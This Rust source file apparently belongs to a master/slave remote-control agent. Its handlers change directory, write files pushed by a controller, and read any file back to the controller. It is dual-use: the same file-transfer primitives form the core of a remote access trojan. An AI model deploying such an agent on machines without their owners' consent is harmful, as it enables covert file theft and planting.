use std::env;
use std::path::Path;
use std::process::Command;
use crate::common::myfs::*;
use crate::common::order::*;

pub fn cmd_cd(slave:&Order) -> Order{
    let mut  res=slave.clone();
    let (_, args) = parse_input(&slave.req).unwrap();

    let new_dir = args[0].clone();
    let old=env::current_dir().unwrap();
    dbg!(&new_dir);
    dbg!(&old);
    if let Err(e) = env::set_current_dir(Path::new(&new_dir)) {
        res.status=FAIL.to_string();
        res.resp=format!("error from cd:{}", e);
        return res;
    }
    res.resp=new_dir;
    res
}

pub fn cmd_send(slave:&Order) -> Order{
    let mut  res=slave.clone();
    let (_, args) = parse_input(&slave.req).unwrap();
    let b64=&slave.resp;
    if args.len() != 2 {
        res.status=FAIL.to_string();
        res.resp="args should be 2 ".to_string();
        return res;
    }
    let savepath = &args[1];
    create_file_dir(savepath);
    let res1 = write_file_as_hex(savepath, b64);
    res2order(res1,&res)
}

pub fn cmd_rec(slave:&Order) -> Order {
    let mut  res=slave.clone();
    let (_, args) = parse_input(&slave.req).unwrap();
    if args.len() != 2 {
        res.status=FAIL.to_string();
        res.resp="args should be 2 ".to_string();
        return res;
    }
    if let Ok(content) = read_file_as_hex(&args[1]) {
        res.resp= content;
        return res;
    }
    res.status=FAIL.to_string();
    res.resp="read file fail".to_string();
    res
}


pub fn res2order(a: anyhow::Result<String>,res:&Order) -> Order{
    let mut res2=res.clone();
    match a {
        Ok(s) => res2.resp=s,
        Err(e) => {
            res2.status=FAIL.to_string();
            res2.resp=format!("error from reply_order:{}", e)
        },
    }
    res2
}
